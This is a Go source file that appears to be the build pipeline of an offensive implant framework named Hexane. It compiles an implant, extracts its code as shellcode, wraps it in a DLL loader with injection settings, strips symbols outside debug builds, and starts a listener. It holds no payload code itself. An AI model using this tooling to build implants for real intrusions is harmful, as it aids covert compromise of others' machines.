package core

import (
	"fmt"
	"os"
	"path"
	"strings"
	"time"
)

var (
	LinkerLoader = LoaderPath + "/linker.loader.ld"
	HashStrings  = ConfigsPath + "/strings.txt"
	DllMain      = LoaderPath + "/dllmain.cpp"
	RsrcScript   = LoaderPath + "/resource.rc"
	HashHeader   = CorelibInc + "/names.hpp"
)

func (h *HexaneConfig) GenerateConfig() error {
	key := CryptCreateKey(16)
	patch, err := h.PePatchConfig()
	if err != nil {
		return err
	}

	h.Key = key
	h.ConfigBytes = patch // Assuming XteaCrypt(patch) if needed.
	return nil
}

func (h *HexaneConfig) GenerateLoader() error {
	injectCfg, err := h.GetInjectConfig()
	if err != nil {
		return err
	}

	injectCfg.InjectConfig = h.GetEmbededStrings(injectCfg.Strings)

	rsrcObj := path.Join(h.Compiler.BuildDirectory, "resource.res")
	rsrcData := path.Join(h.Compiler.BuildDirectory, "shellcode.bin")
	coreCpp := path.Join(h.Compiler.BuildDirectory, "ldrcore.cpp")
	coreComponents := path.Join(h.Compiler.BuildDirectory, "ldrcore.cpp.o")
	output := path.Join(h.Compiler.BuildDirectory, h.ImplantName+h.Compiler.FileExtension)

	if err = h.RunWindres(rsrcObj, rsrcData); err != nil {
		return err
	}

	if err = h.CompileExecuteObject(coreCpp, injectCfg.ExecuteObj, coreComponents); err != nil {
		return err
	}

	components := []string{DllMain, rsrcObj, coreComponents}
	if err = h.CompileFinalDLL(components, output); err != nil {
		return err
	}

	if err = h.EmbedSectionData(output, ".text$G", injectCfg.InjectConfig); err != nil {
		return err
	}

	if !h.Compiler.Debug {
		if err = h.StripSymbols(output); err != nil {
			return err
		}
	}

	return nil
}

func (h *HexaneConfig) GenerateObjects(srcPath, dstPath, linker, outName string, staticLib bool) error {
	if err := CreateTemp(dstPath); err != nil {
		return err
	}

	files, err := FindFiles(srcPath)
	if err != nil {
		return err
	}

	for _, file := range files {
		srcFile := path.Join(srcPath, file.Name())
		objFile := path.Join(dstPath, file.Name()+".o")

		if err := h.CompileFile(srcFile, objFile, linker); err != nil {
			return err
		}

		h.Components = append(h.Components, objFile)
	}

	if staticLib {
		return h.BuildStaticLibrary(dstPath, outName)
	}
	return h.FinalBuild(dstPath, outName)
}

func (h *HexaneConfig) RunBuild() error {

	if err := os.MkdirAll(h.Compiler.BuildDirectory, os.ModePerm); err != nil {
		return err
	}
	if err := h.GenerateConfig(); err != nil {
		return err
	}
	if err := GenerateHashes(HashStrings, HashHeader); err != nil {
		return err
	}

	if !SearchFile(Corelib+"/build", "corelib.a") {
		if err := h.GenerateObjects(CorelibSrc, Corelib+"/build", CorelibLd, "corelib.a", true); err != nil {
			return err
		}
	}

	h.Components = append(h.Components, Corelib+"/build/corelib.a")

	if h.Implant.Injection != nil {
		if err := h.GenerateObjects(Injectlib, path.Join(h.Compiler.BuildDirectory, "build"), InjectlibLd, "injectlib.a", true); err != nil {
			return err
		}
	}

	if err := h.GenerateObjects(ImplantPath, path.Join(h.Compiler.BuildDirectory, "build"), ImplantLd, "implant.o", true); err != nil {
		return err
	}
	if err := h.CopySectionData(path.Join(h.Compiler.BuildDirectory, "build/implant.o"), path.Join(h.Compiler.BuildDirectory, "shellcode.bin"), ".text"); err != nil {
		return err
	}

	if h.BuildType == "dll" {
		if err := h.GenerateLoader(); err != nil {
			return err
		}
	}

	AddConfig(h)
	go h.HttpServerHandler()

	time.Sleep(time.Millisecond * 500)
	WrapMessage("INF", fmt.Sprintf("%s ready!", h.ImplantName))

	return nil
}

func (h *HexaneConfig) CompileFile(srcFile, objFile, linker string) error {
	var flags = h.Compiler.Flags
	if linker != "" {
		flags = append(flags, "-T", linker)
	}

	switch path.Ext(srcFile) {
	case ".cpp":
		return h.CompileObject(h.Compiler.Mingw+" -c ", []string{srcFile}, flags, []string{RootDirectory}, nil, objFile)
	case ".asm":
		return h.CompileObject(h.Compiler.Assembler+" -f win64 ", []string{srcFile}, nil, nil, nil, objFile)
	default:
		return nil
	}
}

func (h *HexaneConfig) RunWindres(rsrcObj, rsrcData string) error {
	cmd := fmt.Sprintf("%s -O coff %s -DRSRCDATA=\"%s\" -o %s", h.Compiler.Windres, RsrcScript, rsrcData, rsrcObj)
	return h.RunCommand(cmd)
}

func (h *HexaneConfig) CompileExecuteObject(coreCpp, executeObj, coreComponents string) error {
	return h.CompileObject(h.Compiler.Mingw+" -c ", []string{coreCpp, executeObj}, nil, h.Compiler.IncludeDirs, nil, coreComponents)
}

func (h *HexaneConfig) CompileFinalDLL(components []string, output string) error {
	return h.CompileObject(h.Compiler.Linker+" -T "+LinkerLoader, components, []string{"-shared"}, h.Compiler.IncludeDirs, nil, output)
}

func (h *HexaneConfig) BuildStaticLibrary(dstPath, outName string) error {
	libFiles := strings.Join(h.Components, " ")
	libName := path.Join(dstPath, outName+" "+libFiles)
	return h.RunCommand(h.Compiler.Ar + " crf " + libName)
}

func (h *HexaneConfig) FinalBuild(dstPath, outName string) error {
	outFile := path.Join(dstPath, outName)
	return h.CompileObject(h.Compiler.Mingw+" -c ", h.Components, h.Compiler.Flags, []string{RootDirectory}, nil, outFile)
}

func (h *HexaneConfig) StripSymbols(output string) error {
	return h.RunCommand(h.Compiler.Strip + " " + output)
}
